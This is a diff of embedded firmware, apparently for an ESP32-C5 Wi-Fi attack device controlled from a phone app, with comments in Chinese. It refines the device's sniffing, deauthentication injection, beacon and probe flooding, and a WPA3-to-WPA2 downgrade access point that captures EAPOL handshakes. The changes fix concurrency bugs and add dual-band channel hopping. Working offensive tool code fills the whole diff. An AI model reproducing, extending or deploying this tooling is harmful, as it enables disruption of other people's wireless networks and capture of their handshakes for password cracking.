     free(a);
-    s_inject_task = NULL;
-    xSemaphoreGive(s_inject_mtx);
+    WDT_DEL();
+    atomic_store(&s_inject_running, false);
     vTaskDelete(NULL);
 }
 
-/* ===================== 公共 API ===================== */
 
 /* 停止所有正在运行的功能 (sniff + inject + downgrade).
  * 任何 _start 函数内部都会先调用此函数实现"启动一个就停其他".
  * 安全可重复调用, 返回 ESP_OK 表示至少停了一个功能. */
 esp_err_t wifi_attack_stop_all(void)
 {
-    wifi_atk_state_t st = atomic_load(&s_state);
     bool stopped_any = false;
 
-    /* 1. 停 downgrade AP (如果是) - 关 promiscuous + SoftAP + HTTP */
-    if (st == WIFI_ATK_DOWNGRADE) {
-        if (atomic_load(&s_channel_rotate)) {
-            atomic_store(&s_channel_rotate, false);
+    /* 按句柄判断而不是只看状态: 注入任务收尾时会先把 state 置 IDLE,
+     * 再删自己, 这中间的空档按状态判断会漏掉这次停止. */
+    if (atomic_load(&s_inject_running)) {
+        atomic_store(&s_inject_stop, true);
+        for (int i = 0; i < 300 && atomic_load(&s_inject_running); i++) {
+            vTaskDelay(pdMS_TO_TICKS(10));
         }
-        esp_wifi_set_promiscuous(false);
-        http_server_stop();   /* 关 SoftAP + HTTP, 切回 STA */
-        atomic_store(&s_state, WIFI_ATK_IDLE);
         stopped_any = true;
     }
 
-    /* 2. 停 sniff (无论是否在 sniff, 都尝试关 promiscuous) */
-    if (st == WIFI_ATK_SNIFF) {
+    wifi_atk_state_t st = atomic_load(&s_state);
+
+    if (st == WIFI_ATK_DOWNGRADE) {
+        atomic_store(&s_channel_rotate, false);
+        esp_wifi_set_promiscuous(false);
+        http_server_stop();
+        atomic_store(&s_state, WIFI_ATK_IDLE);
+        stopped_any = true;
+    } else if (st == WIFI_ATK_SNIFF) {
         sniff_stop_common();
         atomic_store(&s_state, WIFI_ATK_IDLE);
         stopped_any = true;
     } else {
-        /* Defensive: 强制关 promiscuous (防止 race) */
         if (atomic_load(&s_channel_rotate)) {
             atomic_store(&s_channel_rotate, false);
         }
         esp_wifi_set_promiscuous(false);
-    }
-
-    /* 3. 停 inject (设置 flag, 等 task 退出) */
-    if (st == WIFI_ATK_INJECT) {
-        atomic_store(&s_inject_stop, true);
-        for (int i = 0; i < 300 && s_inject_task; i++) {
-            vTaskDelay(pdMS_TO_TICKS(10));
-        }
-        stopped_any = true;
     }
 
     if (stopped_any) {
@@ -356,10 +728,6 @@ esp_err_t wifi_attack_stop_all(void)
 
 esp_err_t wifi_attack_init(void)
 {
-    if (!s_inject_mtx) {
-        s_inject_mtx = xSemaphoreCreateMutex();
-        ESP_RETURN_ON_FALSE(s_inject_mtx, ESP_ERR_NO_MEM, TAG, "mtx create");
-    }
     if (!s_stop_sem) {
         s_stop_sem = xSemaphoreCreateBinary();
         ESP_RETURN_ON_FALSE(s_stop_sem, ESP_ERR_NO_MEM, TAG, "stop sem create");
@@ -383,6 +751,25 @@ esp_err_t wifi_attack_init(void)
     ESP_RETURN_ON_ERROR(esp_wifi_start(), TAG, "wifi start");
     esp_wifi_set_ps(WIFI_PS_NONE);   /* 关省电, 减少 tx 抖动 */
 
+    /* 启用 2.4G + 5G 双频模式 (ESP32-C5 原生支持).
+     * WIFI_BAND_MODE_AUTO 允许在 1-14 (2.4G) 与 36-165 (5G) 信道间切换. */
+    esp_err_t band_err = esp_wifi_set_band_mode(WIFI_BAND_MODE_AUTO);
+    if (band_err != ESP_OK) {
+        ESP_LOGW(TAG, "set band_mode AUTO failed: %s (fallback 2.4G only)",
+                 esp_err_to_name(band_err));
+    } else {
+        /* 双频协议: 2.4G=b/g/n/ax, 5G=a/n/ac/ax */
+        wifi_protocols_t protos = {
+            .ghz_2g = WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_11AX,
+            .ghz_5g = WIFI_PROTOCOL_11A | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_11AC | WIFI_PROTOCOL_11AX,
+        };
+        esp_err_t perr = esp_wifi_set_protocols(WIFI_IF_STA, &protos);
+        if (perr != ESP_OK) {
+            ESP_LOGW(TAG, "set protocols failed: %s", esp_err_to_name(perr));
+        }
+        ESP_LOGI(TAG, "5GHz dual-band enabled (2.4G b/g/n/ax + 5G a/n/ac/ax)");
+    }
+
     wifi_db_init();
     ESP_LOGI(TAG, "Wi-Fi init ok (STA, PS_NONE)");
     rgb_led_set_status(RGB_IDLE);
@@ -396,7 +783,11 @@ esp_err_t wifi_attack_sniff_start(uint8_t channel, uint32_t count)
     if (atomic_load(&s_state) != WIFI_ATK_IDLE) {
         return ESP_ERR_INVALID_STATE;
     }
-    if (channel < 1 || channel > 14) return ESP_ERR_INVALID_ARG;
+    if (!is_valid_channel(channel)) return ESP_ERR_INVALID_ARG;
+
+    /* 等上一次的停止令牌落地再开: 否则" 计数嗅探到数自动停" 紧接着再开,
+     * 迟到的 stopper 会把这一次刚打开的 promiscuous 关掉. */
+    sniff_stop_barrier();
 
     wifi_promiscuous_filter_t filt = {
         .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA,
@@ -406,13 +797,19 @@ esp_err_t wifi_attack_sniff_start(uint8_t channel, uint32_t count)
     esp_wifi_set_promiscuous(true);
     esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
 
-    wifi_db_clear();
+    /* 注意: 这里不再 wifi_db_clear().
+     * App 的扫描流程是 sniff -> stop -> dump, 靠嗅探期累积的表出结果;
+     * 若在 start 时清表, 用户点「仅刷新/重新扫描」时上一轮的 AP/客户端
+     * 会被瞬间抹掉, dump 出来就是空的 (表现为「扫不出来」). 清表交给
+     * 显式的 `dump clear` / `scan clear`, 语义更清晰.
+     * 计数仍归零, 便于本轮统计. */
     atomic_store(&s_sniff_channel, channel);
     /* count=0 -> 永续: 用 UINT32_MAX 占位 (回调里 !=UINT32_MAX 才递减, 故永不动) */
     atomic_store(&s_sniff_remaining, count ? count : UINT32_MAX);
     atomic_store(&s_sniff_total, 0);
     atomic_store(&s_state, WIFI_ATK_SNIFF);
     rgb_led_set_status(RGB_SNIFF_SINGLE);
+    sniff_progress_start();
 
     printf("META,WIFI,SNIFF,START,channel,%u,count,%lu\n",
            channel, (unsigned long)(count ? count : 0xFFFFFFFFUL));
@@ -424,30 +821,46 @@ esp_err_t wifi_attack_sniff_start(uint8_t channel, uint32_t count)
 
 static esp_err_t inject_start_common(inject_args_t *a)
 {
-    /* 互斥: 自动停其他功能 (sniff / downgrade) */
+    /* 互斥: 自动停其他功能 (sniff / downgrade).
+     * 同时也会顶掉正在跑的注入 (新的接管). 顶替必须留痕, 否则上一个
+     * 作业在日志里就是一句普通的"完成 sent=N", 看不出是被换掉的. */
+    if (atomic_load(&s_inject_running)) {
+        printf("META,WIFI,INJECT,SUPERSEDED,mode,%d\n", (int)a->mode);
+        fflush(stdout);
+    }
     wifi_attack_stop_all();
     if (atomic_load(&s_state) != WIFI_ATK_IDLE) {
         free(a);
         return ESP_ERR_INVALID_STATE;
     }
-    if (xSemaphoreTake(s_inject_mtx, pdMS_TO_TICKS(2000)) != pdTRUE) {
-        free(a);
-        return ESP_ERR_TIMEOUT;
+    {
+        bool expected = false;
+        if (!atomic_compare_exchange_strong(&s_inject_running, &expected, true)) {
+            free(a);
+            return ESP_ERR_TIMEOUT;
+        }
     }
     atomic_store(&s_inject_stop, false);
     atomic_store(&s_inject_total, 0);
     atomic_store(&s_state, WIFI_ATK_INJECT);
+    const char *mode_name = (a->mode == INJECT_DEAUTH) ? "deauth" :
+                            (a->mode == INJECT_BEACON) ? "beacon" : "probe";
     switch (a->mode) {
         case INJECT_DEAUTH: rgb_led_set_status(RGB_INJECT_DEAUTH); break;
         case INJECT_BEACON: rgb_led_set_status(RGB_INJECT_BEACON); break;
         case INJECT_PROBE:  rgb_led_set_status(RGB_INJECT_PROBE);  break;
     }
+    /* 立即回执, 让 App 知道任务已启动 (在 cli 捕获窗口内, 会经 BLE 回传) */
+    printf("META,WIFI,INJECT,START,mode,%s,count,%lu,interval,%lu,channel,%u\n",
+           mode_name, (unsigned long)a->count, (unsigned long)a->interval_ms,
+           (unsigned)a->channel);
+    fflush(stdout);
 
-    BaseType_t r = xTaskCreate(inject_task, "inject", 4096, a, 5, &s_inject_task);
+    BaseType_t r = xTaskCreate(inject_task, "inject", 4096, a, 5, NULL);
     if (r != pdPASS) {
         atomic_store(&s_state, WIFI_ATK_IDLE);
+        atomic_store(&s_inject_running, false);
         rgb_led_set_status(RGB_IDLE);
-        xSemaphoreGive(s_inject_mtx);
         free(a);
         return ESP_FAIL;
     }
@@ -469,14 +882,17 @@ esp_err_t wifi_attack_deauth_start(const uint8_t bssid[6], const uint8_t sta[6],
     return inject_start_common(a);
 }
 
-esp_err_t wifi_attack_beacon_flood_start(const char *prefix, uint32_t count, uint32_t interval_ms)
+esp_err_t wifi_attack_beacon_flood_start(const char *prefix, uint32_t count,
+                                        uint32_t interval_ms, uint8_t channel)
 {
     if (!prefix || !prefix[0]) return ESP_ERR_INVALID_ARG;
     inject_args_t *a = calloc(1, sizeof(*a));
     ESP_RETURN_ON_FALSE(a, ESP_ERR_NO_MEM, TAG, "no mem");
     a->mode = INJECT_BEACON;
     strncpy(a->ssid_prefix, prefix, sizeof(a->ssid_prefix) - 1);
-    {
+    if (channel && is_valid_channel(channel)) {
+        a->channel = channel;
+    } else {
         uint8_t ch = atomic_load(&s_sniff_channel);
         a->channel = ch ? ch : 6;
     }
@@ -497,17 +913,17 @@ esp_err_t wifi_attack_probe_flood_start(uint32_t count, uint32_t interval_ms)
 
 esp_err_t wifi_attack_inject_stop(void)
 {
-    if (atomic_load(&s_state) != WIFI_ATK_INJECT) {
+    if (!atomic_load(&s_inject_running)) {
         return ESP_ERR_INVALID_STATE;
     }
     atomic_store(&s_inject_stop, true);
-    for (int i = 0; i < 300 && s_inject_task; i++) {
+    for (int i = 0; i < 300 && atomic_load(&s_inject_running); i++) {
         vTaskDelay(pdMS_TO_TICKS(10));
     }
-    return ESP_OK;
+    return atomic_load(&s_inject_running) ? ESP_ERR_TIMEOUT : ESP_OK;
 }
 
-esp_err_t wifi_attack_sniff_auto_start(uint32_t dwell_ms)
+esp_err_t wifi_attack_sniff_auto_start(uint32_t dwell_ms, uint32_t count)
 {
     /* 互斥: 自动停其他功能 (inject / downgrade) */
     wifi_attack_stop_all();
@@ -516,6 +932,9 @@ esp_err_t wifi_attack_sniff_auto_start(uint32_t dwell_ms)
     }
     if (dwell_ms < 100) dwell_ms = 100;
 
+    /* 同上: 起新会话前先把在飞的停止令牌等落地 */
+    sniff_stop_barrier();
+
     wifi_promiscuous_filter_t filt = {
         .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA,
     };
@@ -523,37 +942,65 @@ esp_err_t wifi_attack_sniff_auto_start(uint32_t dwell_ms)
     esp_wifi_set_promiscuous_rx_cb(wifi_sniff_cb);
     esp_wifi_set_promiscuous(true);
 
-    wifi_db_clear();
+    /* 同 wifi_attack_sniff_start: 不清表. App 走 sniff -> stop -> dump,
+     * start 时清表会让随后的 dump 拿到空结果. */
     atomic_store(&s_dwell_ms, dwell_ms);
     atomic_store(&s_channel_rotate, true);
-    atomic_store(&s_sniff_remaining, UINT32_MAX);
+    /* 轮询嗅探也支持 -n 计数: 之前 CLI 解析出了 -n 却直接丢弃 (void)cnt,
+     * 用户敲 `sniff auto -n 200` 以为到数会停, 实际一直跑到手停. */
+    atomic_store(&s_sniff_remaining, count ? count : UINT32_MAX);
     atomic_store(&s_sniff_total, 0);
+    /* 每次 auto 启动清空命中统计, 避免上一次作业的热点权重污染 */
+    for (int i = 0; i <= CH_IDX_MAX; i++) {
+        atomic_store(&s_ch_hits[i], 0);
+        atomic_store(&s_ch_listen[i], 0);
+    }
+    atomic_store(&s_ch_hits_total, 0);
+    atomic_store(&s_rate_mean, 0);
+    atomic_store(&s_auto_round, 0);
+    atomic_store(&s_auto_dwell_now, dwell_ms);
     atomic_store(&s_state, WIFI_ATK_SNIFF);
     rgb_led_set_status(RGB_SNIFF_AUTO);
+    sniff_progress_start();
 
-    BaseType_t r = xTaskCreate(channel_rotate_task, "chrot", 2048, NULL, 5, NULL);
+    uint32_t rg = (uint32_t)atomic_fetch_add(&s_rotate_gen, 1) + 1;
+    BaseType_t r = xTaskCreate(channel_rotate_task, "chrot", 2048,
+                               (void *)(uintptr_t)rg, 5, NULL);
     if (r != pdPASS) {
         atomic_store(&s_state, WIFI_ATK_IDLE);
         atomic_store(&s_channel_rotate, false);
         esp_wifi_set_promiscuous(false);
+        sniff_progress_stop();
         rgb_led_set_status(RGB_IDLE);
         return ESP_FAIL;
     }
 
-    printf("META,WIFI,SNIFF,AUTO,START,dwell_ms,%u\n", (unsigned)dwell_ms);
+    printf("META,WIFI,SNIFF,AUTO,START,dwell_ms,%u,adaptive,%u\n",
+           (unsigned)dwell_ms, atomic_load(&s_auto_adaptive) ? 1u : 0u);
+    event_publish("WIFI", "sniff auto start dwell=%u", (unsigned)dwell_ms);
     fflush(stdout);
     return ESP_OK;
 }
 
 static void sniff_stop_common(void)
 {
+    /* 先等还在收尾的 stopper 落地, 再原子地把令牌收走.
+     * 令牌收到 0 之后 stopper 再被唤醒会直接跳过, 于是 DONE 只有一份. */
+    sniff_stop_barrier();
+    atomic_store(&s_stop_state, 0);
+
     if (atomic_load(&s_channel_rotate)) {
         atomic_store(&s_channel_rotate, false);
     }
+    sniff_progress_stop();
     /* Directly disable promiscuous - safe from any task context.
      * The callback checks s_state != SNIFF and returns early,
      * so there's no race even if a packet is being processed. */
     esp_wifi_set_promiscuous(false);
+
+    /* DONE 从命令上下文发出: 走 raw_out 而不是 printf, 这样从编排任务等
+     * 非命令上下文调用时也能送到手机 (raw_out 自带 BLE 事件投递). */
+    raw_out("META,WIFI,SNIFF,DONE,total,%u\n", (unsigned)atomic_load(&s_sniff_total));
 }
 
 esp_err_t wifi_attack_sniff_stop(void)
@@ -567,12 +1014,12 @@ esp_err_t wifi_attack_sniff_stop(void)
         if (atomic_load(&s_channel_rotate)) {
             atomic_store(&s_channel_rotate, false);
         }
+        sniff_progress_stop();
         esp_wifi_set_promiscuous(false);
         return ESP_ERR_INVALID_STATE;
     }
     sniff_stop_common();
     atomic_store(&s_state, WIFI_ATK_IDLE);
-    xSemaphoreGive(s_stop_sem);
     return ESP_OK;
 }
 
@@ -583,7 +1030,11 @@ void wifi_attack_status(void)
                          (st == WIFI_ATK_INJECT)     ? "INJECT"    :
                          (st == WIFI_ATK_DOWNGRADE)  ? "DOWNGRADE" : "IDLE";
     bool auto_ch = atomic_load(&s_channel_rotate);
-    printf("META,WIFI,STATUS,state,%s,channel,%u,auto_ch,%u,sniff_total,%u,inject_total,%u,aps,%u,clients,%u,eapols,%u\n",
+    /* tasks: 当前任务数. 它是任务泄漏类缺陷的唯一可观测指标:
+     * 进度任务 / 信道轮询任务一旦在" 停→立刻再开" 时重复起来, 任务数会
+     * 逐轮累加, 别的读数(META 行、堆)全都看不出来. */
+    printf("META,WIFI,STATUS,state,%s,channel,%u,auto_ch,%u,sniff_total,%u,"
+           "inject_total,%u,aps,%u,clients,%u,eapols,%u,mtu,%u,ble,%u,phy,%u,tasks,%u\n",
            stname,
            (unsigned)atomic_load(&s_sniff_channel),
            auto_ch ? 1u : 0u,
@@ -591,12 +1042,59 @@ void wifi_attack_status(void)
            (unsigned)atomic_load(&s_inject_total),
            (unsigned)wifi_db_ap_count(),
            (unsigned)wifi_db_client_count(),
-           (unsigned)wifi_db_eapol_count());
+           (unsigned)wifi_db_eapol_count(),
+           (unsigned)ble_cli_mtu(), ble_cli_connected() ? 1u : 0u,
+           (unsigned)ble_cli_phy(),
+           (unsigned)uxTaskGetNumberOfTasks());
+    if (auto_ch) wifi_attack_auto_dump();
     fflush(stdout);
 }
 
+/* 统计输出: 自适应轮询把时间花在哪些信道上
+ * 只在 auto 模式且已有命中时输出, 最多 8 行, 供串口 / App 观察调度是否合理.
+ * 用局部快照排序, 绝不改动统计本身 (否则下一次调度就被污染). */
+void wifi_attack_auto_dump(void)
+{
+    uint32_t total = atomic_load(&s_ch_hits_total);
+    if (total == 0) return;
 
-/* ===================== WPA3 -> WPA2 Downgrade AP ===================== */
+    uint32_t base = atomic_load(&s_dwell_ms);
+    uint32_t fair = total / (uint32_t)(N_CH_2G + N_CH_5G);
+    if (fair == 0) fair = 1;
+
+    printf("META,WIFI,AUTO,STATS,round,%u,total_hits,%u,dwell_now,%u,base,%u\n",
+           (unsigned)atomic_load(&s_auto_round), (unsigned)total,
+           (unsigned)atomic_load(&s_auto_dwell_now), (unsigned)base);
+
+    enum { TOPN = 8 };
+    int      top_ch[TOPN];
+    uint32_t top_v[TOPN];
+    int      top_n = 0;
+
+    for (int i = 1; i <= CH_IDX_MAX; i++) {
+        uint32_t v = (uint32_t)atomic_load(&s_ch_hits[i]);
+        if (v < fair) continue;                 /* 低于平均份额的不报 */
+        /* 插入有序表 (最多 8 项, O(TOPN) 足够) */
+        if (top_n < TOPN) {
+            int p = top_n++;
+            while (p > 0 && top_v[p - 1] < v) { top_v[p] = top_v[p - 1]; top_ch[p] = top_ch[p - 1]; p--; }
+            top_v[p] = v; top_ch[p] = i;
+        } else if (v > top_v[TOPN - 1]) {
+            int p = TOPN - 1;
+            while (p > 0 && top_v[p - 1] < v) { top_v[p] = top_v[p - 1]; top_ch[p] = top_ch[p - 1]; p--; }
+            top_v[p] = v; top_ch[p] = i;
+        }
+    }
+
+    for (int i = 0; i < top_n; i++) {
+        printf("META,WIFI,AUTO,CH,%d,hits,%u,dwell,%u\n",
+               top_ch[i], (unsigned)top_v[i],
+               (unsigned)auto_dwell_for((uint8_t)top_ch[i], base));
+    }
+}
+
+
+/* WPA3 -> WPA2 Downgrade AP */
 
 esp_err_t wifi_attack_downgrade_start(const char *ssid, const char *pass)
 {
@@ -615,6 +1113,9 @@ esp_err_t wifi_attack_downgrade_start(const char *ssid, const char *pass)
     esp_err_t e = http_server_start(ssid, pass);
     if (e != ESP_OK) return e;
 
+    /* 起新会话前把在飞的停止令牌等落地 */
+    sniff_stop_barrier();
+
     /* 开 promiscuous 抓 EAPOL 4-way handshake (仅 DATA 帧, 减少噪声) */
     wifi_promiscuous_filter_t filt = {
         .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA,
@@ -623,6 +1124,11 @@ esp_err_t wifi_attack_downgrade_start(const char *ssid, const char *pass)
     esp_wifi_set_promiscuous_rx_cb(wifi_sniff_cb);
     esp_wifi_set_promiscuous(true);
 
+    /* 降级抓握手是永续的: 必须把上一轮" 计数嗅探" 剩下的 s_sniff_remaining
+     * 冲成永续. 否则上次 `sniff -n 50` 中途被用户停掉(还剩 30)接着开降级,
+     * 收到 30 包后回调判定到数, 把降级的抓包悄悄停了. SoftAP 还亮着,
+     * 但 EAPOL 一条都收不到, 现象是" 降级跑起来却抓不到握手". */
+    atomic_store(&s_sniff_remaining, UINT32_MAX);
     atomic_store(&s_state, WIFI_ATK_DOWNGRADE);
     rgb_led_set_status(RGB_SNIFF_AUTO);   /* 复用 auto 状态, 后续可加专用状态 */
 
@@ -652,7 +1158,7 @@ esp_err_t wifi_attack_downgrade_stop(void)
 }
 
 
-/* ===================== 外部 getter (HTTP 用) ===================== */
+/* 外部 getter (HTTP 用) */
 int wifi_atk_state_val(void)       { return (int)atomic_load(&s_state); }
 uint8_t wifi_atk_channel(void)     { return (uint8_t)atomic_load(&s_sniff_channel); }
 bool wifi_atk_auto_ch(void)        { return atomic_load(&s_channel_rotate); }
